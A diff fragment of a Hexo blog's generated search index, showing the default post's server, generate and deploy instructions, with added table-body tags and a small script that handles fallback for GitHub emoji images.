 <p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-]]></content>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
   </entry>
 </search>
